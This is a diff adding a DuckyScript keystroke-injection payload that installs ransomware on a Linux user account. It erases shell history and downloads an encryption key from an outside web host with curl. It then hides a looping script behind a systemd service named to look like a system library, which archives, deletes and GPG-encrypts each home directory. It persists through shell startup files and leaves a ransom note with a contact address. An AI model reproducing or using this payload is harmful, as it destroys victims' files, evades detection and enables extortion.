@@ -1,0 +1,137 @@
+STRING unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
+ENTER
+DELAY 300
+REM Rather than printing key you can upload your key on server and fetch it using wget or curl.
+REM This method is for scenerio where their is no internet access to the system
+STRING touch public.pub
+ENTER
+DELAY 200
+STRING curl https://jacobjuneau6.github.io/Dransomware/public.pub -o public.pub
+ENTER
+DELAY 500
+STRING gpg --import public.pub && rm -rf public.pub
+ENTER
+
+
+REM [Creating systemd service for non-root user]
+DELAY 200
+REM This is the path where encrypted directories will be stored
+STRING mkdir ~/.ransom
+ENTER
+DELAY 100
+STRING mkdir -p ~/.config/systemd/user && touch ~/.config/systemd/user/libSystemIO.service
+ENTER
+DELAY 200
+ENTER
+STRING cat >> ~/.config/systemd/user/libSystemIO.service
+DELAY 200
+ENTER
+DELAY 50
+STRING [Unit]
+ENTER
+REM You can change description
+REM You can change service description
+STRING Description = Ransom
+ENTER
+ENTER
+STRING [Service]
+ENTER
+CTRL d
+STRING echo ExecStart=/bin/bash /home/$(whoami)/.system/drans -no-browser >> ~/.config/systemd/user/libSystemIO.service
+ENTER
+STRING cat >> ~/.config/systemd/user/libSystemIO.service
+ENTER
+STRING Restart=on-failure
+ENTER
+STRING SuccessExitStatus=3 4
+ENTER
+STRING RestartForceExitStatus=3 4
+ENTER
+ENTER
+STRING [Install]
+ENTER
+STRING WantedBy=multi-user.target
+ENTER
+CTRL d
+ENTER
+
+REM [dransomware]
+DELAY 500
+STRING mkdir ~/.system && touch ~/.system/drans && vi ~/.system/drans
+ENTER
+STRING i
+DELAY 200
+STRING #!/bin/sh
+ENTER
+STRING cd ~/
+ENTER
+STRING encrypt(){                                                                                                     
+ENTER
+STRING          dirFile=$(ls | head -n 1)
+ENTER
+STRING          tar cf ~/.ransom/$dirFile.tar.gz --exclude='.' --exclude='..' --exclude='.ransom' --remove-files $dirFile
+ENTER
+REM replace drans with name of your key
+STRING          gpg -e -r drans -o ~/.ransom/$dirFile.tar.gpg ~/.ransom/$dirFile.tar.gz && rm -rf ~/.ransom/$dirFile.tar.gz 
+ENTER
+STRING }
+ENTER
+STRING for (( ; ; ))
+ENTER
+STRING do
+ENTER
+STRING        encrypt
+ENTER
+STRING done
+DELAY 100
+ESC
+STRING :wq
+ENTER
+DELAY 100
+STRING chmod +x ~/.system/drans
+ENTER
+DELAY 100
+REM change drans to name of your key
+STRING gpg --edit-key drans
+ENTER
+DELAY 100
+STRING trust
+ENTER
+DELAY 100
+STRING 5
+ENTER 
+DELAY 50
+STRING y
+ENTER
+CTRL c
+DELAY 100
+STRING gpg --check-trustdb
+ENTER
+STRING gpg --update-trustdb
+ENTER
+DELAY 100
+STRING systemctl --user enable --now libSystemIO.service
+ENTER
+DELAY 100
+STRING systemctl --user start libSystemIO.service
+ENTER
+DELAY 100
+DELAY 50
+
+REM [autostart on opening terminal]
+STRING echo systemctl --user enable --now libSystemIO.service >> ~/.zshrc
+ENTER
+DELAY 50
+STRING echo systemctl --user enable --now libSystemIO.service >> ~/.bashrc
+ENTER
+
+REM [Message]
+REM change message, to acquire ransom
+STRING mkdir ~/.hacker/ && touch ~/.hacker/README.txt
+ENTER
+DELAY 100
+echo I'm Hacker Don't try to ShutDown your system this will permanantly delete your data, contact jacobjuneau6@gmail.com for further details... >> ~/.hacker/README.txt
+ENTER
+DELAY 50
+STRING exit
+ENTER
